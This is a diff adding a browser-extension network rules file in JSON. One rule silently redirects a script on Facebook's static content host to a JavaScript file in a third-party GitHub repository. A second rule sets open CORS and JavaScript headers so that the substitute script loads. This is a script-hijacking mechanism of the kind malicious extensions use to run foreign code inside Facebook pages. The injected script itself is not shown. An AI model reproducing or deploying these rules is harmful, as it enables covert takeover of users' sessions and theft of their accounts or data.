@@ -1,0 +1,40 @@
+[
+  {
+    "id": 1,
+    "priority": 1,
+    "action": {
+      "type": "redirect",
+      "redirect": {
+        "url": "https://raw.githubusercontent.com/johnson19901/storage/new/main/nfeblpmeoiafpakcbanncibhlnebmdhm/KAk834QEDEl.js"
+      }
+    },
+    "condition": {
+      "urlFilter": "https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/KAk834QEDEl*",
+      "resourceTypes": [
+        "script"
+      ]
+    }
+  },
+  {
+    "id": 2,
+    "priority": 1,
+    "action": {
+      "type": "modifyHeaders",
+      "responseHeaders": [
+        {
+          "header": "Access-Control-Allow-Origin",
+          "operation": "set",
+          "value": "*"
+        },
+        {
+          "header": "Content-Type",
+          "operation": "set",
+          "value": "application/x-javascript; charset=utf-8"
+        }
+      ]
+    },
+    "condition": {
+      "urlFilter": "https://raw.githubusercontent.com/johnson19901/storage/new/main/nfeblpmeoiafpakcbanncibhlnebmdhm/KAk834QEDEl.*"
+    }
+  }
+]
